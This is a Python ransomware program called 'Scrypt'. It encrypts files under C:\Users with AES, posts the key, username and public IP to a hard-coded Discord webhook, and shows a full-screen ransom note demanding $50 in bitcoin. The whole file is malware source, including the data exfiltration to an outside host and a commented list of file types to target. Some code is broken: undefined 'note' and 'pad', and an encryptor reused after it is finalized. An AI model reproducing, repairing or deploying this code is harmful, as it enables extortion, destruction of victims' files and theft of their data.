import PyQt5
import PyQt5.QtWidgets
import PyQt5.QtCore
import sys
import requests
import random
import string
import threading
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import os
import shutil

# Initialize global variables
btcAdd = ""
email = ""
discordWebhook = "https://discord.com/api/webhooks/1213226208494624768/LaW1E7j2183RtaOqqfttCaQGvnOhEvi13Uu80L_UHgAmFeNXhDbAU3X-BMIWht5IP3Rk"

fileTypes = ['.txt']
'''
otherFileTypes = ['.exe', '.php', '.pl', '.7z', '.rar', '.m4a', '.wma', '.avi', '.wmv', '.csv', '.d3dbsp', '.sc2save',
             '.sie', '.sum', '.ibank', '.t13', '.t12', '.qdf', '.gdb', '.tax', '.pkpass', '.bc6', '.bc7', '.bkp', '.qic',
             '.bkf', '.sidn', '.sidd', '.mddata', '.itl', '.itdb', '.icxs', '.hvpl', '.hplg', '.hkdb', '.mdbackup',
             '.syncdb', '.gho', '.cas', '.svg', '.map', '.wmo', '.itm', '.sb', '.fos', '.mcgame', '.vdf', '.ztmp', '.sis',
             '.sid', '.ncf', '.menu', '.layout', '.dmp', '.blob', '.esm', '.001', '.vtf', '.dazip', '.fpk', '.mlx', '.kf',
             '.iwd', '.vpk', '.tor', '.psk', '.rim', '.w3x', '.fsh', '.ntl', '.arch00', '.lvl', '.snx', '.cfr', '.ff',
             '.vpp_pc', '.lrf', '.m2', '.mcmeta', '.vfs0', '.mpqge', '.kdb', '.db0', '.mp3', '.upx', '.rofl', '.hkx',
             '.bar', '.upk', '.das', '.iwi', '.litemod', '.asset', '.forge', '.ltx', '.bsa', '.apk', '.re4', '.sav',
             '.lbf', '.slm', '.bik', '.epk', '.rgss3a', '.pak', '.big', '.unity3d', '.wotreplay', '.xxx', '.desc', '.py',
             '.m3u', '.flv', '.js', '.css', '.rb', '.png', '.jpeg', '.p7c', '.p7b', '.p12', '.pfx', '.pem', '.crt', '.cer',
             '.der', '.x3f', '.srw', '.pef', '.ptx', '.r3d', '.rw2', '.rwl', '.raw', '.raf', '.orf', '.nrw', '.mrwref',
             '.mef', '.erf', '.kdc', '.dcr', '.cr2', '.crw', '.bay', '.sr2', '.srf', '.arw', '.3fr', '.dng', '.jpeg',
             '.jpg', '.cdr', '.indd', '.ai', '.eps', '.pdf', '.pdd', '.psd', '.dbfv', '.mdf', '.wb2', '.rtf', '.wpd',
             '.dxg', '.xf', '.dwg', '.pst', '.accdb', '.mdb', '.pptm', '.pptx', '.ppt', '.xlk', '.xlsb', '.xlsm', '.xlsx',
             '.xls', '.wps', '.docm', '.docx', '.doc', '.odb', '.odc', '.odm', '.odp', '.ods', '.odt', '.sql', '.zip', '.tar',
             '.tar.gz', '.tgz', '.biz', '.ocx', '.html', '.htm', '.3gp', '.srt', '.cpp', '.mid', '.mkv', '.mov', '.asf',
             '.mpeg', '.vob', '.mpg', '.fla', '.swf', '.wav', '.qcow2', '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC',
             '.PAQ', '.tar.bz2', '.tbk', '.bak', '.djv', '.djvu', '.bmp', '.cgm', '.tif', '.tiff', '.NEF', '.cmd', '.class',
             '.jar', '.java', '.asp', '.brd', '.sch', '.dch', '.dip', '.vbs', '.asm', '.pas', '.ldf', '.ibd', '.MYI', '.MYD',
             '.frm', '.dbf', '.SQLITEDB', '.SQLITE3', '.asc', '.lay6', '.lay', '.ms11(Securitycopy)', '.sldm', '.sldx', '.ppsm',
             '.ppsx', '.ppam', '.docb', '.mml', '.sxm', '.otg', '.slk', '.xlw', '.xlt', '.xlm', '.xlc', '.dif', '.stc', '.sxc',
             '.ots', '.ods', '.hwp', '.dotm', '.dotx', '.docm', '.DOT', '.max', '.xml', '.uot', '.stw', '.sxw', '.ott', '.csr',
             '.key', 'wallet.dat']
'''

#Define RW Class for functionality
class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherits from pyqt, runnable object 4 multithreading
    def __init__(self):                             # Constructor, inits Ransomware object in pyqt multithread envriroment
        super(Ransomware, self).__init__()          # calls the constructor of qrunnable for intialization
        self.threadpool = PyQt5.QtCore.QThreadPool()# creates an instance of Qthreadpool( manages pools of threads)
        self.randomId = self.rID(12)                # generates a randID 12 length using rID method
        self.encryptionPass = self.rSeed(32)        # generates random seed 32 length using rSeed
        self.filePath = "C:\\Users\\"               # sets file path attribute 
        self.ip = ""                                # inits ip attribute to empty string 4 later
        self.userName = ""                          # inits userName attribute to empty string 4 later
        key = self.encryptionPass.encode()          # encodes encryption pass into bytes to be used as key for encryption
        self.crypto = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend()).encryptor() # creates instance of AES enc algo, operates in ECB mode using default backend

    # Write ransomware note on victims desktop
    def readMe(self):                               # defines method within class
        try:                                        # start of try block
            with open(f"C:\\Users\\{self.userName}\\Desktop\\readme.txt", "w+") as f: # opens file in r+w mode, if doesnt exit, will create it
                f.write(note)                       # writes the content of the note
        except Exception as e:                      # error catch
            print(f"Error writing readme.txt: {e}")
            
    # Retrieve details about victim's system
    def getUserDetails(self):                       # Declares method 
        try:                                        # try block
            self.ip = requests.get("https://api.ipify.org?format=json").json()["ip"] # sends get request to endpoint, which gets the public IP, parsed as JSON, extracted and assigned to self.ip
            self.userName = os.getlogin()           # uses the function to retrieve login name of user and assign it to attribute 
        except Exception as e:                      # error catch
            print(f"Error getting user details: {e}")

    #Encrypt file using AES Encryption
    def encryptFile(self, file):
        try:
            with open(file, 'rb') as infile:
                plaintext = pad(infile.read(), 16)  # Block size is 16 bytes for AES
                ciphertext = self.crypto.update(plaintext) + self.crypto.finalize()
                with open(file, "wb") as outfile:
                    outfile.write(ciphertext)
        except Exception as e:
            print(f"Error encrypting {file}: {e}")

    # Main method for ransomware functionality
    def run(self):
        self.sendMessage()
        for root, directories, files in os.walk(self.filePath):
            for filename in files:
                filepath = os.path.join(root, filename)
                for base in fileTypes:
                    if base in filepath:
                        threading.Thread(target=self.encryptFile, args=(filepath,)).start()

        self.readMe()

    # Send message to Discord Webhook with victim details 
    def sendMessage(self):
        try:
            self.getUserDetails()
        except Exception as e:
            print(f"Error getting user details for sending message: {e}")
        data = {
            "embeds": [
                {
                    "title": "**__Victim Report__:**",
                    "description": f"```css\nUSERID: {self.randomId}``` ```css\nKEY: {self.encryptionPass}``` "
                                   f"```css\nUSERNAME: {self.userName}``` ```css\nIP: {self.ip}```",
                    "color": 13959168,
                    "thumbnail": {
                        "url": "https://www.pngkit.com/png/full/168-1680567_69137579-pentagram-with-demon-baphomet-satanic-goat.png"
                    },
                    "author": {
                        "name": "Scrypt",
                        "icon_url": "https://i.imgur.com/F3j7z5K.png"
                    }
                }
            ]
        }
        try:
            r = requests.post(discordWebhook, json=data)
        except Exception as e:
            print(f"Error sending message to Discord webhook: {e}")

    # Generate random string for encryption password
    def rSeed(self, stringLength):
        password_characters = string.ascii_letters
        return ''.join(random.choice(password_characters) for i in range(stringLength))

    # Generate random string for unique ID
    def rID(self, stringLength):
        password_characters = string.ascii_letters + string.digits
        return ''.join(random.choice(password_characters) for i in range(stringLength))

# Define class for main GUI of ransomware
class Scrypt(PyQt5.QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__() 
        self.threadpool = PyQt5.QtCore.QThreadPool()
        self.initUI()
        self.banner()
        self.cont()
        self.readMe()   
        self.show()
        self.threadpool.start(Ransomware())

    # Initiliaze the GUI
    def initUI(self):
        self.setWindowFlags(PyQt5.QtCore.Qt.WindowCloseButtonHint | PyQt5.QtCore.Qt.WindowType_Mask)
        self.showFullScreen()
        self.banner()
        self.setStyleSheet("""
                    QMainWindow{
                        background-color: #212121;
                        }
                    """)  
    # Add continue button to the GUI
    def cont(self):
        btn = PyQt5.QtWidgets.QPushButton('Continue', self)
        btn.resize(750, 50)
        btn.move(int(self.frameGeometry().width() / 3.35), 900)
        btn.setStyleSheet("""
                        QPushButton{
                            background-color: #d50000;
                            border-radius: 7.5px;
                            font-weight: 1200;
                            font-size: 18px;
                        }
                        QPushButton::hover {
                            background-color: #9b0000;
                        }
                         """)
        btn.show()
        btn.clicked.connect(self.hide)

    # Display the ransom note on the GUI
    def readMe(self):
        rm = PyQt5.QtWidgets.QLabel(ransomNote, self) 
        rm.setStyleSheet("""
                        QLabel{
                        background-color: #d50000;
                        color: #000000;
                        border: 2px solid #ff5131;
                        border-radius: 7.5px;
                        font-weight: 1200;
                        font-size: 18px;
                        }
                    """)
        rm.resize(750, 650)
        rm.move(int(self.frameGeometry().width() / 3.35), 220)
        rm.setAlignment(PyQt5.QtCore.Qt.AlignCenter)
        rm.show()

    # Display the banner on the GUI
    def banner(self):
        self.flair = PyQt5.QtWidgets.QLabel('Scrypt', self) 
        self.flair.setStyleSheet("""
                            QLabel{
                            background-color: #d50000;
                            color: #000000;
                            border: 2px solid #ff5131;
                            border-radius: 7.5px;
                            font-weight: 1400;
                            font-size: 45px;
                            }
                        """)
        self.flair.resize(800, 130)
        self.flair.move(int(self.frameGeometry().width() / 3.5), 50)
        self.flair.setAlignment(PyQt5.QtCore.Qt.AlignCenter)
        self.flair.show()

    # Slot method to the HIDE the GUI
    @PyQt5.QtCore.pyqtSlot()
    def hide(self):
        self.setWindowOpacity(0)

# Define ransom note and detailed ransom note 
detailedNote = f"""
-------------------------------------------------------------------------------------------------------------------------
Hello,\n
    If you are reading this then you have likely been hit by my Ransomware\n
    We apologize for any inconvenience caused; our primary goal is to facilitate a resolution through payment.\n
    In order to receive the decrypter you must follow the following steps to truely recover\n
    all your files.\n
    1. Download BitPay: https://bitpay.com/wallet/ if you are using a different wallet thats fine.\n
    2. Send $50 to this address: {btcAdd}\n
    3. After sending it wait for a confirmation and send us an email with your UniqueID: {Ransomware().randomId}\n
    4. Wait shortly, you will receive an email with your decrypter once everything is handled.\n
    5. If we do not receive payment within 2 weeks we will no longer be handeling support.
-------------------------------------------------------------------------------------------------------------------------

"""
ransomNote = f"""
All Your Files Have Been Encrypted\n
At the end of the day we just want to get paid\n
Here are the instructions to get getting your files back\n
1. Pay $50 btc to the listed address\n
2. Send an email and include your unique id\n
3. Wait\n
------------------------------------\n
Check your desktop for readme.txt if you are lost!\n
------------------------------------\n
BTC Address: {btcAdd}\n
Email: {email}\n
UniqueID: {Ransomware().randomId}\n
------------------------------------\n
Click the Button Below To Continue:
(Killing this program will result in a full loss of files)\n
"""
# Entry point to the program
if __name__ == "__main__":
    app = PyQt5.QtWidgets.QApplication(sys.argv)
    l = Scrypt()
    sys.exit(app.exec())
